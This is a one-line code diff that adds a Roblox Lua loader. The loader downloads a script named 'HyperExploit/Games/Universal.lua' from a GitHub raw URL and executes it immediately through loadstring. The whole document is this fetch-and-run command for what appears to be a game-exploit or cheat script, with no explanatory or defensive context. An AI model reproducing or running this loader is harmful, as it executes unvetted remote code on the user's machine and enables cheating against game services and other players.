@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hyper0939/Scripts/refs/heads/main/HyperExploit/Games/Universal.lua"))()
